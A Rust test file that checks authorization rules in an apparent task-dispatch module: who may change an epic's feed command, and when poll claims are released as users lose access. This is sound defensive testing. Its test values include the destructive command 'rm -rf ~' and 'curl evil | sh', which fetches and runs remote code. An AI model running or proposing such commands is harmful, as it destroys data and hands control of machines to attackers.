//! Task #98746 (V6–V9): poll claims follow sight, `feed_command` has an
//! authority rule, the sweep that archives learnings stops at the caller's
//! workspaces, and a managed PR Reviews root is its creator's own.

use dispatch_spacetime_module as module;

use super::*;

const WS1: i64 = 1;
const WS2: i64 = 2;

fn member(id: i64, workspace_id: i64, user: &str, role: &str) -> module::Membership {
    module::Membership {
        id,
        workspace_id,
        user: user.into(),
        role: role.into(),
        ..module::blank_membership()
    }
}

fn host(id: &str, owner: &str) -> module::Host {
    module::Host {
        id: id.into(),
        label: String::new(),
        owner: owner.into(),
    }
}

fn claim(id: i64, epic_id: i64, host: &str) -> module::PollOwner {
    module::PollOwner {
        id,
        scope: POLL_SCOPE_EPIC.into(),
        scope_id: epic_id,
        host: host.into(),
        claimed_at: TEST_STAMP.into(),
    }
}

fn epic(id: i64, workspace_id: i64, creator: &str) -> module::Epic {
    module::Epic {
        id,
        workspace_id,
        created_by: creator.into(),
        created_at: TEST_STAMP.into(),
        updated_at: TEST_STAMP.into(),
        ..module::blank_epic()
    }
}

/// `me` administers workspaces 1 and 2; `bob` and `carol` belong to workspace
/// 1 only. Epic 1 is `bob`'s, in workspace 1, with a feed command, and hosts
/// `h-me`, `h-bob` and `h-carol` each belong to their person.
fn scenario() -> MemoryReducerCaller {
    let (caller, _rows) = caller();
    let caller = caller.with_sender("me").with_workspace_rules();
    {
        let mut t = caller.lock();
        for (id, name) in [(WS1, "Core"), (WS2, "Other")] {
            t.workspaces.insert(
                id,
                module::Workspace {
                    id,
                    name: name.into(),
                    ..module::blank_workspace()
                },
            );
        }
        for m in [
            member(1, WS1, "me", "admin"),
            member(2, WS1, "bob", "member"),
            member(3, WS1, "carol", "member"),
            member(4, WS2, "me", "admin"),
        ] {
            t.memberships.insert(m.id, m);
        }
        t.epics.insert(
            1,
            module::Epic {
                feed_command: "gh-feed".into(),
                ..epic(1, WS1, "bob")
            },
        );
        for h in [
            host("h-me", "me"),
            host("h-bob", "bob"),
            host("h-carol", "carol"),
        ] {
            t.hosts.insert(h.id.clone(), h);
        }
    }
    caller
}

/// Make `who` the identity of the next calls, as a second board would be.
fn act_as(caller: &mut MemoryReducerCaller, who: &str) {
    caller.sender = who.into();
}

fn claim_hosts(caller: &MemoryReducerCaller) -> Vec<String> {
    let mut hosts: Vec<String> = caller
        .lock()
        .poll_owners
        .values()
        .map(|p| p.host.clone())
        .collect();
    hosts.sort();
    hosts
}

fn give_claims(caller: &MemoryReducerCaller) {
    let mut t = caller.lock();
    for p in [claim(1, 1, "h-bob"), claim(2, 1, "h-me")] {
        t.poll_owners.insert(p.id, p);
    }
}

// -- V6: claims follow sight ------------------------------------------------

#[test]
fn removing_a_member_releases_the_poll_claims_their_hosts_hold() {
    let caller = scenario();
    give_claims(&caller);
    caller.apply_remove_member(2).unwrap(); // bob leaves workspace 1
    assert_eq!(claim_hosts(&caller), ["h-me"]);
}

#[test]
fn removing_a_member_keeps_claims_on_epics_in_their_other_workspaces() {
    let caller = scenario();
    {
        let mut t = caller.lock();
        t.epics.insert(2, epic(2, WS2, "me"));
        t.memberships.insert(5, member(5, WS2, "bob", "member"));
        for p in [claim(1, 1, "h-bob"), claim(2, 2, "h-bob")] {
            t.poll_owners.insert(p.id, p);
        }
    }
    caller.apply_remove_member(2).unwrap();
    let t = caller.lock();
    assert!(!t.poll_owners.contains_key(&1));
    assert!(t.poll_owners.contains_key(&2));
}

#[test]
fn moving_an_epic_releases_claims_held_for_people_who_lose_sight_of_it() {
    let caller = scenario();
    give_claims(&caller);
    caller
        .apply_move_epic_to_workspace(EpicId(1), WS2)
        .unwrap()
        .applied()
        .unwrap();
    assert_eq!(claim_hosts(&caller), ["h-me"]);
}

// -- V7: the archive sweep stops at the caller's sight ------------------------

fn stale_learning(id: i64, workspace_id: i64) -> module::Learning {
    module::Learning {
        id,
        kind: "pitfall".into(),
        summary: "summary".into(),
        detail: None,
        scope: "user".into(),
        scope_ref: None,
        tags: "[]".into(),
        status: "approved".into(),
        source_task_id: None,
        upvote_count: 0,
        last_upvoted_at: None,
        created_at: TEST_STAMP.into(),
        updated_at: TEST_STAMP.into(),
        embedding: None,
        workspace_id,
        author: "bob".into(),
    }
}

#[test]
fn the_archive_sweep_leaves_other_workspaces_learnings_alone() {
    let caller = scenario().with_sender("bob"); // bob is in workspace 1 only
    {
        let mut t = caller.lock();
        for l in [stale_learning(1, WS1), stale_learning(2, WS2)] {
            t.learnings.insert(l.id, l);
        }
    }
    caller
        .apply_archive_stale_learnings(at("9999-01-01 00:00:00.000"))
        .unwrap();
    let t = caller.lock();
    assert_eq!(t.learnings[&1].status, "archived");
    assert_eq!(t.learnings[&2].status, "approved");
}

// -- V8: who may change feed_command ------------------------------------------

async fn set_command(caller: &mut MemoryReducerCaller, who: &str) -> ReducerOutcome {
    act_as(caller, who);
    caller
        .patch_epic(
            EpicId(1),
            bindings::EpicPatch {
                feed_command: Some("rm -rf ~".into()),
                ..blank_epic_patch()
            },
        )
        .await
        .unwrap()
}

#[tokio::test]
async fn a_member_who_only_sees_the_epic_cannot_change_its_feed_command() {
    let mut caller = scenario();
    give_claims(&caller);
    let outcome = set_command(&mut caller, "carol").await;
    assert!(matches!(outcome, ReducerOutcome::Refused(_)), "{outcome:?}");
    assert_eq!(caller.lock().epics[&1].feed_command, "gh-feed");
}

#[tokio::test]
async fn the_creator_and_an_admin_may_change_it() {
    for who in ["bob", "me"] {
        let mut caller = scenario();
        give_claims(&caller);
        let outcome = set_command(&mut caller, who).await;
        assert!(
            matches!(outcome, ReducerOutcome::Applied(_)),
            "{who}: {outcome:?}"
        );
        assert_eq!(caller.lock().epics[&1].feed_command, "rm -rf ~");
    }
}

/// Task #98851 (M2): holding the claim is not authorship. A claim is something
/// any host can take, so the owner of the claiming host has no say over what
/// the command is.
#[tokio::test]
async fn the_owner_of_the_host_holding_the_claim_may_not_change_it() {
    let mut caller = scenario();
    caller.lock().poll_owners.insert(1, claim(1, 1, "h-carol"));
    let outcome = set_command(&mut caller, "carol").await;
    assert!(matches!(outcome, ReducerOutcome::Refused(_)), "{outcome:?}");
    assert_eq!(caller.lock().epics[&1].feed_command, "gh-feed");
}

/// A real change records its author and drops the claims of every host whose
/// owner is not that person, so the author's own host can claim the feed.
#[tokio::test]
async fn changing_the_command_records_the_setter_and_releases_other_claims() {
    let mut caller = scenario();
    give_claims(&caller); // h-bob and h-me
    let outcome = set_command(&mut caller, "me").await; // an admin, not the creator
    assert!(matches!(outcome, ReducerOutcome::Applied(_)), "{outcome:?}");
    assert_eq!(caller.lock().epics[&1].feed_command_set_by, "me");
    assert_eq!(claim_hosts(&caller), ["h-me"]);
}

#[tokio::test]
async fn keeping_the_command_keeps_the_setter_and_the_claims() {
    let mut caller = scenario();
    give_claims(&caller);
    act_as(&mut caller, "bob");
    caller
        .patch_epic(
            EpicId(1),
            bindings::EpicPatch {
                feed_command: Some("gh-feed".into()),
                title: Some("renamed".into()),
                ..blank_epic_patch()
            },
        )
        .await
        .unwrap();
    assert_eq!(caller.lock().epics[&1].feed_command_set_by, "");
    assert_eq!(claim_hosts(&caller), ["h-bob", "h-me"]);
}

/// A new epic that carries a command is a command set by its creator.
#[tokio::test]
async fn creating_an_epic_with_a_command_records_its_creator_as_the_setter() {
    let mut caller = scenario();
    act_as(&mut caller, "carol");
    let id = caller
        .create_epic(bindings::Epic {
            workspace_id: WS1,
            feed_command: "curl evil | sh".into(),
            // A client's claim about who set it is ignored.
            feed_command_set_by: "bob".into(),
            ..blank_bindings_epic()
        })
        .await
        .unwrap();
    assert_eq!(caller.lock().epics[&id.0].feed_command_set_by, "carol");
}

#[tokio::test]
async fn creating_an_epic_without_a_command_records_no_setter() {
    let mut caller = scenario();
    act_as(&mut caller, "carol");
    let id = caller
        .create_epic(bindings::Epic {
            workspace_id: WS1,
            ..blank_bindings_epic()
        })
        .await
        .unwrap();
    assert_eq!(caller.lock().epics[&id.0].feed_command_set_by, "");
}

#[tokio::test]
async fn setting_the_command_it_already_has_needs_no_authority() {
    let mut caller = scenario();
    act_as(&mut caller, "carol");
    let outcome = caller
        .patch_epic(
            EpicId(1),
            bindings::EpicPatch {
                feed_command: Some("gh-feed".into()),
                title: Some("renamed".into()),
                ..blank_epic_patch()
            },
        )
        .await
        .unwrap();
    assert!(matches!(outcome, ReducerOutcome::Applied(_)), "{outcome:?}");
}

// -- V9: a managed root is its creator's own ------------------------------------

#[test]
fn each_person_provisions_a_private_managed_root_of_their_own() {
    let mut caller = scenario();
    for who in ["bob", "carol"] {
        act_as(&mut caller, who);
        caller
            .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
            .unwrap();
    }
    let t = caller.lock();
    let roots: Vec<&module::Epic> = t
        .epics
        .values()
        .filter(|e| e.feed_role == module::ROLE_REVIEWS_PARENT)
        .collect();
    assert_eq!(roots.len(), 2, "one root each, not one shared root");
    assert!(roots.iter().all(|e| e.visibility == "private"));
    let mut creators: Vec<&str> = roots.iter().map(|e| e.created_by.as_str()).collect();
    creators.sort();
    assert_eq!(creators, ["bob", "carol"]);
}

#[test]
fn a_public_root_its_creator_finds_is_made_private() {
    let mut caller = scenario();
    caller.lock().epics.insert(
        7,
        module::Epic {
            feed_role: module::ROLE_REVIEWS_PARENT.into(),
            feed_command: "old".into(),
            visibility: "public".into(),
            ..epic(7, WS1, "bob")
        },
    );
    act_as(&mut caller, "bob");
    caller
        .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
        .unwrap();
    let t = caller.lock();
    assert_eq!(t.epics[&7].visibility, "private");
    assert_eq!(t.epics[&7].feed_command, "reviews.sh");
    assert_eq!(
        t.epics
            .values()
            .filter(|e| e.feed_role == module::ROLE_REVIEWS_PARENT)
            .count(),
        1
    );
}

#[test]
fn another_persons_public_root_is_not_reused_or_rewritten() {
    let mut caller = scenario();
    caller.lock().epics.insert(
        7,
        module::Epic {
            feed_role: module::ROLE_REVIEWS_PARENT.into(),
            feed_command: "bobs-command".into(),
            visibility: "public".into(),
            ..epic(7, WS1, "bob")
        },
    );
    act_as(&mut caller, "carol");
    caller
        .apply_ensure_managed_epics("carols.sh".into(), 600, String::new(), 0)
        .unwrap();
    let t = caller.lock();
    assert_eq!(t.epics[&7].feed_command, "bobs-command");
    assert!(t
        .epics
        .values()
        .any(|e| e.feed_role == module::ROLE_REVIEWS_PARENT && e.created_by == "carol"));
}

// -- M2: claiming and overriding need sight, and a feed epic its setter ----------

fn blank_bindings_epic() -> bindings::Epic {
    module::blank_epic().into()
}

async fn claim_for(
    caller: &mut MemoryReducerCaller,
    who: &str,
    target: PollScopeId,
    host: &str,
) -> ReducerOutcome {
    act_as(caller, who);
    caller.claim_poll_owner(target, host.into()).await.unwrap()
}

async fn override_for(
    caller: &mut MemoryReducerCaller,
    who: &str,
    target: PollScopeId,
    host: &str,
) -> ReducerOutcome {
    act_as(caller, who);
    caller
        .override_poll_owner(target, host.into())
        .await
        .unwrap()
}

fn make_private(caller: &MemoryReducerCaller, epic_id: i64) {
    caller.lock().epics.get_mut(&epic_id).unwrap().visibility = "private".into();
}

#[tokio::test]
async fn a_claim_on_an_epic_the_caller_cannot_see_is_refused() {
    let mut caller = scenario();
    make_private(&caller, 1); // bob's, so carol cannot see it
    for out in [
        claim_for(
            &mut caller,
            "carol",
            PollScopeId::Epic(EpicId(1)),
            "h-carol",
        )
        .await,
        override_for(
            &mut caller,
            "carol",
            PollScopeId::Epic(EpicId(1)),
            "h-carol",
        )
        .await,
    ] {
        assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
    }
    assert!(claim_hosts(&caller).is_empty());
}

#[tokio::test]
async fn a_claim_on_a_task_the_caller_cannot_see_is_refused() {
    let mut caller = scenario();
    caller.lock().tasks.insert(
        1,
        module::Task {
            id: 1,
            owner: "bob".into(),
            ..module::blank_task()
        },
    );
    let out = claim_for(
        &mut caller,
        "carol",
        PollScopeId::Task(TaskId(1)),
        "h-carol",
    )
    .await;
    assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
    let out = claim_for(&mut caller, "bob", PollScopeId::Task(TaskId(1)), "h-bob").await;
    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
}

/// Carol sees bob's public feed epic but her host may not poll a command bob
/// wrote, claimed or overridden.
#[tokio::test]
async fn a_host_whose_owner_did_not_set_the_command_cannot_claim_the_feed() {
    let mut caller = scenario();
    for out in [
        claim_for(
            &mut caller,
            "carol",
            PollScopeId::Epic(EpicId(1)),
            "h-carol",
        )
        .await,
        override_for(
            &mut caller,
            "carol",
            PollScopeId::Epic(EpicId(1)),
            "h-carol",
        )
        .await,
    ] {
        assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
    }
    assert!(claim_hosts(&caller).is_empty());
    // The creator's own host may (no setter recorded: it falls back to created_by).
    let out = claim_for(&mut caller, "bob", PollScopeId::Epic(EpicId(1)), "h-bob").await;
    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
    assert_eq!(claim_hosts(&caller), ["h-bob"]);
}

#[tokio::test]
async fn a_recorded_setter_wins_over_the_creator() {
    let mut caller = scenario();
    caller.lock().epics.get_mut(&1).unwrap().feed_command_set_by = "carol".into();
    let out = claim_for(&mut caller, "bob", PollScopeId::Epic(EpicId(1)), "h-bob").await;
    assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
    let out = claim_for(
        &mut caller,
        "carol",
        PollScopeId::Epic(EpicId(1)),
        "h-carol",
    )
    .await;
    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
}

#[tokio::test]
async fn an_epic_without_a_command_can_be_claimed_by_any_host_that_sees_it() {
    let mut caller = scenario();
    caller.lock().epics.get_mut(&1).unwrap().feed_command = String::new();
    let out = claim_for(
        &mut caller,
        "carol",
        PollScopeId::Epic(EpicId(1)),
        "h-carol",
    )
    .await;
    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
}

// -- M4: every loss-of-sight path releases the claims it strands --------------

/// Carol's host holds the claim on epic 1 (bob's, in workspace 1); bob's host
/// holds one too. A path that takes carol's sight of epic 1 away must release
/// hers and keep bob's. The graduated check: a new loss-of-sight path adds a
/// row here, and a path that forgets the release fails it.
async fn carol_loses_sight_by(path: &str, caller: &mut MemoryReducerCaller) {
    match path {
        "remove_member" => {
            caller.apply_remove_member(3).unwrap(); // carol leaves workspace 1
        }
        "move_epic_to_workspace" => {
            caller
                .apply_move_epic_to_workspace(EpicId(1), WS2)
                .unwrap()
                .applied()
                .unwrap();
        }
        "set_epic_visibility" => {
            act_as(caller, "bob");
            caller
                .apply_set_epic_visibility(EpicId(1), "private".into())
                .unwrap()
                .applied()
                .unwrap();
        }
        "reparent_under_a_private_epic" => {
            caller.lock().epics.insert(
                2,
                module::Epic {
                    visibility: "private".into(),
                    ..epic(2, WS1, "bob")
                },
            );
            act_as(caller, "bob");
            caller
                .patch_epic(
                    EpicId(1),
                    bindings::EpicPatch {
                        parent_epic_id: Some(2),
                        ..blank_epic_patch()
                    },
                )
                .await
                .unwrap()
                .applied()
                .unwrap();
        }
        "managed_root_made_private" => {
            {
                let mut t = caller.lock();
                let root = t.epics.get_mut(&1).unwrap();
                root.feed_role = module::ROLE_REVIEWS_PARENT.into();
                root.feed_command = "reviews.sh".into();
                root.feed_interval_secs = 600;
            }
            act_as(caller, "bob");
            caller
                .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
                .unwrap();
        }
        other => panic!("unknown loss-of-sight path {other}"),
    }
}

const LOSS_OF_SIGHT_PATHS: [&str; 5] = [
    "remove_member",
    "move_epic_to_workspace",
    "set_epic_visibility",
    "reparent_under_a_private_epic",
    "managed_root_made_private",
];

#[tokio::test]
async fn every_loss_of_sight_path_releases_the_claims_it_strands() {
    for path in LOSS_OF_SIGHT_PATHS {
        let mut caller = scenario();
        {
            let mut t = caller.lock();
            // Bob's epic: his host and carol's both hold it (carol's by an
            // earlier, now-refused kind of claim: a legacy row).
            for p in [claim(1, 1, "h-bob"), claim(2, 1, "h-carol")] {
                t.poll_owners.insert(p.id, p);
            }
            // Bob stays a member wherever the path leaves the epic.
            t.memberships.insert(6, member(6, WS2, "bob", "member"));
        }
        carol_loses_sight_by(path, &mut caller).await;
        let hosts = claim_hosts(&caller);
        assert!(
            !hosts.contains(&"h-carol".to_string()),
            "{path}: carol's claim survived: {hosts:?}"
        );
        assert!(
            hosts.contains(&"h-bob".to_string()),
            "{path}: bob's claim was released: {hosts:?}"
        );
    }
}

/// The sub-epics of a tree that goes private are covered too.
#[tokio::test]
async fn a_visibility_flip_also_releases_claims_on_the_sub_epics() {
    let mut caller = scenario();
    {
        let mut t = caller.lock();
        t.epics.insert(
            2,
            module::Epic {
                parent_epic_id: 1,
                ..epic(2, WS1, "bob")
            },
        );
        t.poll_owners.insert(1, claim(1, 2, "h-carol"));
    }
    act_as(&mut caller, "bob");
    caller
        .apply_set_epic_visibility(EpicId(1), "private".into())
        .unwrap()
        .applied()
        .unwrap();
    assert!(claim_hosts(&caller).is_empty());
}
